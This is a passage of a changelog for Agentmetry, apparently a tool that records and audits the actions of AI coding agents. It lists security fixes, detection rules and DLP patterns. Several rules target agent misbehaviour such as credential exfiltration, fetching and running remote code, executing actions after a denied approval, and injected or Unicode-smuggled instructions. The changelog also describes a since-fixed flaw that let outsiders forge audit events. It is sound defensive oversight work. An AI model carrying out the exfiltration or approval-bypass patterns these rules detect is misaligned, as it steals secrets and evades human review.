### Security
- **The enterprise MSI installed an unauthenticated remote API.** It set
  `AGENTMETRY_HOST=0.0.0.0` and registered a LocalSystem service bound to all
  interfaces, while `require_api_key` is deliberately a no-op when no key is
  set, and the MSI set none. Anyone able to reach the host could read the trail,
  download the evidence pack, inject forged events into the tamper-evident
  chain, and close detections as `risk_accepted` — a decision then recorded as a
  legitimate human action. The MSI now binds `127.0.0.1`, and
  `agentmetry doctor` **fails** on a non-loopback bind with no API key, so any
  future packaging that repeats the combination is caught.

### Fixed
- **A rule rename orphaned every disposition recorded against it,** and deleting
  a rule left decisions pointing at nothing. Both failures were silent, and both
  made a reviewed period read as unreviewed, which is the opposite of what the
  triage loop exists to prove. Renames are now declared in `RULE_ALIASES`, keys
  canonicalise through it, and a row written under an old name migrates to the
  new one on the next decision rather than forking into two. Dispositions whose
  rule has been retired are kept as evidence and surfaced by `doctor` instead of
  being dropped. An unknown `rule_id` is refused at the write boundary, so a
  typo cannot become an orphan; replay stays permissive, because the trail is
  the record and an event naming a retired rule still happened.
- **Sequence-rule ordering was decided by a coin flip on a timestamp tie.** The
  tie-break ended with `event_id`, a random UUID, so "did A happen before B" —
  the question every sequence rule asks — was answered at random whenever two
  events shared a timestamp. Ties are common: Windows clock granularity is about
  15 ms, so two tool calls in one agent turn routinely collide. Ordering now
  falls back to arrival order, which the trail supplies. The README's claim that
  ordering is enforced by position rather than co-occurrence is true again.
- **Off-hours detection used the wrong clock on Windows.** Windows ships no IANA
  timezone database, so `AGENTMETRY_BUSINESS_TZ` could not resolve and the rule
  silently fell back to UTC: a 14:00 New York action was reported as
  out-of-hours, and a genuine 03:00 action could pass as business hours.
  `tzdata` is now a Windows dependency, and the fallback logs a warning instead
  of being silent.
- **Boot-time disposition replay could erase triage history.** Wiring
  `rebuild_from_trail()` into startup made an unconditional index wipe run on
  every boot, so a pruned, rotated, restored or repointed trail silently deleted
  every disposition. The findings survived, so the period read as *untriaged*
  rather than *unknown*, which is backwards for ISO/IEC 42001 cl. 10 evidence. A
  rebuild that cannot account for a key already in the index now refuses
  (`DispositionRebuildRefused`); boot logs the refusal and carries on.
- **Replayed dispositions lost their `event_id`,** so a rebuilt row could not be
  traced back to the trail line that recorded the decision.
- **`host_id` was resolved per event.** It is cached again; a hostname does not
  change under a running process.
- **Evidence packs were exporting the wrong store.** `build_evidence_pack` still
  read the removed governed runtime's outbox, so the flagship EU AI Act export
  contained driver-mount noise while thousands of real captured events sat
  unexported. It now reads the canonical audit trail. Pack schema is **2.1**,
  adding `tool_calls`, `approvals` (with an explicit `inferred` flag),
  `detections` with the triage state in force, `dispositions`, a `controls`
  snapshot with policy-manifest hashes, `meta.producer`, and the trail-chain
  head.
- **Burst rules had no clock.** `session-tool-burst`, `destructive-delete-burst`
  and the swarm rules counted events across a whole session rather than a time
  window, so a long normal session eventually tripped them. They now measure the
  densest window.
- **Host detection checkpoints never expired,** so one host-level firing
  silenced that rule on that host permanently. Checkpoints now age out after 6
  hours.
- **`SubagentStop` was mapped to `session_end`** on the parent correlation,
  which flushed the parent's still-pending approvals as inferred-denied in the
  middle of a live session. It is now a `tool_called` lifecycle marker.
- **Claude Code subagents were invisible to the swarm rule.** Claude spawns
  through the `Task` tool and emits no `SubagentStart`, so the most used agent
  CLI was the one blind spot. `Task` calls are now tagged `subagent_start:<type>`
  and excluded from the generic tool-burst count.
- **Kimi `stream-json` recorded every call as a success** and never closed the
  turn. Results are now buffered by `tool_call` id and honour `is_error`,
  unresolved calls are flushed at EOF, and `Interrupt` ends the session.
- **`aws_secret_key` DLP matched no real key.** The pattern relied on `\b`
  against `AWS_SECRET_ACCESS_KEY`, where `_` is a word character, and did not
  survive the JSON escaping the scanner sees. It is now anchored on the
  assignment and no longer fires on 40-character git SHAs.
- **`agentmetry doctor` failed on a missing demo vault** for a SIEM-only
  install. It now checks the recorder path first (trail chain, spool, detection,
  manifests, hooks) and treats vault and drivers as optional warnings.
- **Disposition events carried no `host_id`,** so a fleet forwarding to one SIEM
  could not attribute a decision. "Somebody accepted this risk" is not an answer.
- **Version drift.** `pyproject.toml` and the API advertised 0.2.0 while 0.2.1
  was tagged and shipped. The version now has one home (`core/version.py`), the
  API and evidence-pack `meta.producer` read it, and a test fails if it
  disagrees with the newest CHANGELOG section.

### Changed
- **`fleet_id` is omitted when unset** rather than emitted as an empty string.
  An empty value on every event is noise in the trail and a trap in a SIEM,
  where `fleet_id="*"` would match unconfigured hosts. `doctor` warns when it is
  not set.
- **ECS categories are semantically correct.** `detection` maps to
  `intrusion_detection`, and `tool_denied` / `tool_failed` carry both `process`
  and `intrusion_detection`. A correlated finding filed under `process`
  disappeared among the tool calls it was raised about.
- Detection rules match on hook-side traits **or** the plaintext command, so
  correlated detection works under the default privacy configuration where no
  `tool.command` reaches the trail. Most sequence rules were previously dead on
  real traffic.
- The live-detection durability claim is scoped to what it actually covers: the
  local trail insert gates the checkpoint, so a detection re-fires after a local
  write failure. Network sink forwarding is best-effort by design and a down
  SIEM does not block the checkpoint.

## [0.2.1] - 2026-07-20

### Added
- **YAML detection manifest** (`agentmetry/policies/detection/manifest.yaml`) — tunable burst
  thresholds and analyst-authored session count rules (no Python PR).
- **Hook-side detection traits** (`tool.traits`) — command classification at the hook
  before hashing so sequence rules work with default privacy config (no `tool.command`
  in trail).
- **Enterprise lane doc** — [`docs/compliance/enterprise-lane.md`](docs/compliance/enterprise-lane.md)
  (honest limits vs optional fleet/EDR path).
- **Chinese agent capture (Sprint C).** Kimi `stream-json` print-mode ingest
  (`python scripts/agentmetry_ingest.py kimi stream-json`), `session-tool-burst`
  and `host-subagent-swarm-burst` detection rules, DashScope-specific DLP,
  host-level live detection aggregation, Trae MCP-proxy adapter stub, and
  `scripts/install_chinese_hooks.ps1` (all Chinese CLIs in one script).
- **Chinese agent capture (Sprint B).** Qoder and CodeBuddy hook adapters,
  `subagent-swarm-burst` detection rule, Chinese provider DLP (Tencent SecretId,
  API key assignments, env overrides), CN cloud CLI coverage in
  `credential-read-then-cloud-api`, extended tool policy for kimi/qwen/deepseek.
- **Chinese agent capture (Sprint A).** Qwen Code and Kimi Code Tier B hooks:
  `map_qwen_hook`, `map_kimi_hook`, `install_qwen_hooks.ps1`, `install_kimi_hooks.ps1`,
  dashboard badges, and [`docs/integrations/chinese-agents.md`](docs/integrations/chinese-agents.md).
- **Detection rules (HF July 2026 patterns).** Three sequence rules for agentic
  intrusion patterns seen in governed coding-agent sessions:
  `credential-read-then-cloud-api`, `dotfile-read-then-git-push`, and
  `remote-staging-then-execute`.
- **DLP:** Hugging Face access token pattern (`hf_…`).
- **Docs:** [`docs/compliance/local-llm-forensics.md`](docs/compliance/local-llm-forensics.md)
  — forensic playbook for analyzing JSONL trails with a self-hosted model when
  commercial APIs block incident payloads (the "asymmetry problem" from Hugging
  Face's July 2026 disclosure).

### Changed
- **Agentmetry-only scope.** Removed legacy Agentic OS / email / LangGraph docs and
  config; `agentmetry doctor` is green without demo vault; CLI `recovery` removed.
- **External ingest.** `qwen`, `kimi`, `crewai`, and `opensre` are first-class
  `source_app` values (no longer rewritten to `cursor` in canonical events).
- **MITRE credential paths:** `.docker/config.json` and `.config/gcloud` upgrade
  file reads to T1552 (Credentials In Files).

## [0.2.0] - 2026-07-19

First tagged public-alpha release. A local-first flight recorder and mini-SIEM
for AI coding agents: capture tool calls at the IDE and MCP boundary, tag them
with MITRE ATT&CK, correlate sequences into detections, and keep a
tamper-evident JSONL trail you own.

### Added
- **Capture.** IDE lifecycle hooks for Cursor, Claude Code, Codex and
  Antigravity, plus an MCP stdio audit proxy. Hooks self-install at orchestrator
  boot (`bootstrap_tier_b_hooks`), with no per-repo setup.
- **Canonical schema v1.1.0.** Typed, SIEM-ready JSON with `actor`, `initiator`,
  `model`, and a `tool` block carrying `input_hash`, `parameters_redacted`, and a
  MITRE `{tactic_id, tactic, technique_id, technique}` object.
- **Correlated detection.** Nine sequence rules (`credential-exfil`,
  `approval-denied-then-executed`, `encoded-command-download`,
  `pr-merged-without-review`, `untrusted-input-then-risky-action`,
  `destructive-delete-burst`, `autonomous-unapproved-write`,
  `discovery-then-collect`, opt-in `off-hours-activity`), including the two
  published Agent Data Injection chains ([arXiv:2607.05120](https://arxiv.org/abs/2607.05120)).
  Ordering is enforced by position, not co-occurrence. Detections stream to every
  sink as first-class events.
- **Durable live detection state.** SQLite checkpoint of emitted rules and
  session event windows, which survives an orchestrator restart without
  re-firing.
- **Local DLP.** A regex engine scanning tool arguments at the hook boundary,
  `log` (default) or `block` mode, recording the rule id and never the matched
  value. Covers cloud keys, GitHub PATs, Slack tokens, bearer headers, private
  keys, US SSN, invisible-Unicode instruction smuggling, and known supply-chain
  exfil artifacts.
- **Tool allow/deny policy.** A YAML manifest enforced at the hook boundary
  before DLP; `command_pattern` rules match across all four IDE payload shapes.
- **Pre-execution enforcement.** `block` decisions are emitted only on genuinely
  pre-execution hooks. After-hooks record the match but never deny, since the
  tool has already run.
- **JSONL hash chain.** The file sink writes tamper-evident chained envelopes;
  `agentmetry verify --trail` validates the chain, reports legacy unchained
  prefix lines separately, and prints the chain head for out-of-band recording.
- **SIEM forwarding.** File, generic webhook, Elastic ECS, Splunk HEC, Loki via
  Grafana Alloy, a Sigma pack, and an alert webhook on denied or error outcomes.
- **Dashboard (Phase 1).** A Next.js hunt layout with an Event stream, a
  Detections triage view, and Analytics (MITRE breakdown, session process tree),
  light and dark, with CSV/JSONL export.
- **Evidence.** Export packs with a SHA-256 integrity manifest; `agentmetry
  verify` recomputes it.
- **Ops CLI.** `agentmetry doctor`, `stats`, `export`, `verify`, `verify
  --trail`, and `start`/`stop`/`status`.
- **Compliance kit.** An ISO 42001 mapping and an EU AI Act deployer checklist.
- **Install.** Windows one-flow `scripts/install.ps1`. The orchestrator, tests,
  and hook bootstrap also run on Linux (CI runs on Ubuntu).

### Fixed
- Inferred approvals bind to the action that was actually approved. The matcher
  compared tool names only, so an approval for `Bash(rm -rf /tmp/x)` could be
  consumed by a later `Bash(ls)`. It now compares `input_hash` when both sides
  carry one, and a mismatch leaves the approval pending so it resolves as denied
  at session end, exposing the proposed-versus-executed gap in the trail.
- Enforcement (`block`) is emitted only on genuinely pre-execution hooks. An
  after-hook match is recorded but never turned into a deny, since the tool has
  already run.
- Live detections are written to the local trail before being checkpointed, so
  a detection is never lost to a local write failure — it re-fires on the next
  session event. Network sink forwarding (webhook, Elastic, Splunk, Loki) is
  best-effort and does not gate the checkpoint: a down SIEM logs the error and
  the local trail remains the source of truth, which is where the dashboard and
  `verify --trail` read from.
- Loki forwarding unwraps the hash-chain envelope, so the documented LogQL
  queries resolve their fields again.
- API key comparison is constant-time (`secrets.compare_digest`), so the key
  cannot be recovered a byte at a time through response timing.

### Changed
- `core/config.py` groups the SIEM recorder settings first and the optional
  governed-runtime settings separately, with a pointer to their doc. No settings
  changed: field names, defaults, and environment aliases are identical.

### Known limitations
- Approval *responses* are inferred, not observed, since no IDE reports the
  human's click. Inferred events are marked `inferred:*` and never presented as
  native.
- The MCP proxy is stdio-only; remote Streamable-HTTP servers are not yet seen.
- DLP is regex, not entropy- or ML-based.
- Tamper-evidence covers lines written after chaining was enabled, so a
  long-running trail can carry a large legacy unchained prefix. The chain
  protects the JSONL, not the SQLite index the dashboard reads.
- Agentmetry records the agents you wire in. It is not a CASB and does not see
  unmanaged ChatGPT or an IDE with hooks disabled.

[Unreleased]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.9...HEAD
[0.9.9]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.8...v0.9.9
[0.9.8]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.7...v0.9.8
[0.9.7]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.6...v0.9.7
[0.9.6]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.5...v0.9.6
[0.9.5]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.4...v0.9.5
[0.9.4]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.3...v0.9.4
[0.9.3]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.2...v0.9.3
[0.9.2]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.1...v0.9.2
[0.9.1]: https://github.com/blitzcrieg1/agentmetry/compare/v0.9.0...v0.9.1
[0.9.0]: https://github.com/blitzcrieg1/agentmetry/compare/v0.8.0...v0.9.0
[0.8.0]: https://github.com/blitzcrieg1/agentmetry/compare/v0.7.0...v0.8.0
[0.7.0]: https://github.com/blitzcrieg1/agentmetry/compare/v0.6.0...v0.7.0
[0.6.0]: https://github.com/blitzcrieg1/agentmetry/compare/v0.5.0...v0.6.0
[0.5.0]: https://github.com/blitzcrieg1/agentmetry/compare/v0.4.0...v0.5.0
[0.4.0]: https://github.com/blitzcrieg1/agentmetry/compare/v0.3.0...v0.4.0
[0.3.0]: https://github.com/blitzcrieg1/agentmetry/compare/v0.2.1...v0.3.0
[0.2.1]: https://github.com/blitzcrieg1/agentmetry/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/blitzcrieg1/agentmetry/releases/tag/v0.2.0

[#100]: https://github.com/blitzcrieg1/agentmetry/issues/100
[#132]: https://github.com/blitzcrieg1/agentmetry/issues/132
[#133]: https://github.com/blitzcrieg1/agentmetry/issues/133
[#137]: https://github.com/blitzcrieg1/agentmetry/issues/137
[#138]: https://github.com/blitzcrieg1/agentmetry/issues/138
[#139]: https://github.com/blitzcrieg1/agentmetry/issues/139
[#140]: https://github.com/blitzcrieg1/agentmetry/issues/140
[#141]: https://github.com/blitzcrieg1/agentmetry/issues/141
[#142]: https://github.com/blitzcrieg1/agentmetry/issues/142
[#144]: https://github.com/blitzcrieg1/agentmetry/issues/144
[#146]: https://github.com/blitzcrieg1/agentmetry/issues/146
[#147]: https://github.com/blitzcrieg1/agentmetry/issues/147
[#148]: https://github.com/blitzcrieg1/agentmetry/issues/148
[#149]: https://github.com/blitzcrieg1/agentmetry/issues/149
[#150]: https://github.com/blitzcrieg1/agentmetry/issues/150
[#152]: https://github.com/blitzcrieg1/agentmetry/issues/152
[#154]: https://github.com/blitzcrieg1/agentmetry/issues/154
[#157]: https://github.com/blitzcrieg1/agentmetry/issues/157
[#158]: https://github.com/blitzcrieg1/agentmetry/issues/158
[#159]: https://github.com/blitzcrieg1/agentmetry/issues/159
[#160]: https://github.com/blitzcrieg1/agentmetry/issues/160
[#162]: https://github.com/blitzcrieg1/agentmetry/issues/162
[#167]: https://github.com/blitzcrieg1/agentmetry/issues/167
[#168]: https://github.com/blitzcrieg1/agentmetry/issues/168
[#169]: https://github.com/blitzcrieg1/agentmetry/issues/169
[#170]: https://github.com/blitzcrieg1/agentmetry/issues/170
[#173]: https://github.com/blitzcrieg1/agentmetry/issues/173
[#179]: https://github.com/blitzcrieg1/agentmetry/issues/179
[@hossainzarif23]: https://github.com/hossainzarif23
[@kkkhs]: https://github.com/kkkhs
[#186]: https://github.com/blitzcrieg1/agentmetry/pull/186
